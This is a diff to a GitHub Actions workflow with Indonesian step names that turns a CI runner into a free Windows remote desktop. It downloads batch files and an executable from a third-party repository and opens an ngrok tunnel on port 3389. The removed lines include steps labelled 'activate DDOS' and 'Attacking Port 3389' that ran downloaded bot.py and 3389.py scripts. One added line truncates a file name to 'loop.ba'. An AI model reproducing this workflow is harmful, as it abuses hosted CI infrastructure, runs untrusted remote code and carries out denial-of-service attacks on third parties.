@@ -15,9 +15,7 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/main/start.bat -OutFile start.bat
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/main/wallpaper.png -OutFile wallpaper.png
         Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/main/wallpaper.bat -OutFile wallpaper.bat
-        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/main/loop.bat -OutFile loop.bat
-        Invoke-WebRequest https://github.com/SyzuTopia54y/xrdp/raw/main/bot.py -OutFile bot.py
-        Invoke-WebRequest https://github.com/SyzuTopia54y/xrdp/raw/main/3389.py -OutFile 3389.py
+        Invoke-WebRequest https://raw.githubusercontent.com/SyzuTopia54y/xrdp/main/loop.bat -OutFile loop.ba
     - name: Mendownload Launcher.
       run: |
         Invoke-WebRequest https://github.com/SyzuTopia54y/xrdp/raw/main/launcher/Ganti%20Password.exe -OutFile "Ganti Password.exe"
@@ -37,10 +35,6 @@ jobs:
         copy "Ganti Password.exe" "C:\Users\Public\Desktop\Ganti Password.exe"
     - name: Membuat Tunnel.
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
-    - name: Mengaktifkan DDOS.
-      run: Start-Process Powershell -ArgumentList '-Noexit -Command "python bot.py"'
-    - name: Attacking Port 3389.
-      run: Start-Process Powershell -ArgumentList '-Noexit -Command "python 3389.py"'
     - name: Connect Ke RDP Kamu CPU 2 Core - 7GB Ram - 256 SSD.
       run: cmd /c start.bat
     - name: Berhasil Dibuat! Anda Bisa Menutup Tab Sekarang.
